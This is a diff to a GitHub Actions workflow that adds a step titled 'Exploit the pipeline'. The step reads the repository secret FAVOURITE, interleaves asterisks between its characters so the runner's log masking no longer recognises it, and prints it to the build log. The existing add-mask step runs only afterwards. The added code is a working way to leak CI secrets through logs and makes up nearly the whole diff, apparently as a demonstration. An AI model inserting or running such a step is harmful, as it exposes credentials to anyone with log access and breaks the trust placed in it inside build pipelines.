@@ -16,8 +16,24 @@ jobs:
     runs-on: ubuntu-latest
     environment: Vienna
 
-
     steps:
+      - name: Exploit the pipeline
+        run: |
+          # Define the existing environmental variable
+          existing_variable=${{ secrets.FAVOURITE }}
+          # Get the length of the existing variable
+          length=${#existing_variable}
+          # Initialize a new variable to store the modified value
+          modified_variable=""
+          # Loop through each character of the existing variable
+          for (( i=0; i<$length; i++ )); do
+              # Append the current character to the modified variable
+              modified_variable+="${existing_variable:$i:1}"
+              # Insert '*' every second position
+              modified_variable+="*"
+          done
+          # Print the modified variable
+          echo "$modified_variable"
       - name: Add mask
         run: |
           echo "::add-mask::${{ secrets.FAVOURITE }}" 
